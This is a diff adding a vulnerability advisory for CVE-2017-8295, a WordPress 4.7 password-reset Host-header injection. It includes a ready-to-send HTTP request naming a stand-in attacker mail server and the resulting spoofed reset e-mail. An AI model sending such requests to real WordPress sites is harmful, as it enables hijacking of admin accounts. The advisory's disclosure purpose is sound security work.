@@ -1,0 +1,71 @@
+=============================================
+- Discovered by: Dawid Golunski
+- dawid[at]legalhackers.com
+- https://legalhackers.com
+
+- CVE-2017-8295
+- Release date: 03.05.2017
+- Revision 1.0
+- Severity: Medium/High
+=============================================
+
+Source: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
+
+If an attacker sends a request similar to the one below to a default Wordpress
+installation that is accessible by the IP address (IP-based vhost):
+
+-----[ HTTP Request ]----
+
+POST /wp/wordpress/wp-login.php?action=lostpassword HTTP/1.1
+Host: injected-attackers-mxserver.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+
+user_login=admin&redirect_to=&wp-submit=Get+New+Password
+
+------------------------
+
+
+Wordpress will trigger the password reset function for the admin user account.
+
+Because of the modified HOST header, the SERVER_NAME will be set to
+the hostname of attacker's choice.
+As a result, Wordpress will pass the following headers and email body to the
+/usr/bin/sendmail wrapper:
+
+
+------[ resulting e-mail ]-----
+
+Subject: [CompanyX WP] Password Reset
+Return-Path: <wordpress@attackers-mxserver.com>
+From: WordPress <wordpress@attackers-mxserver.com>
+Message-ID: <e6fd614c5dd8a1c604df2a732eb7b016@attackers-mxserver.com>
+X-Priority: 3
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+Someone requested that the password be reset for the following account:
+
+http://companyX-wp/wp/wordpress/
+
+Username: admin
+
+If this was a mistake, just ignore this email and nothing will happen.
+
+To reset your password, visit the following address:
+
+<http://companyX-wp/wp/wordpress/wp-login.php?action=rp&key=AceiMFmkMR4fsmwxIZtZ&login=admin>
+
+-------------------------------
+
+
+As we can see, fields Return-Path, From, and Message-ID, all have the attacker's
+domain set.
+
+
+The verification of the headers can be performed by replacing /usr/sbin/sendmail with a 
+bash script of:
+
+#!/bin/bash
+cat > /tmp/outgoing-email
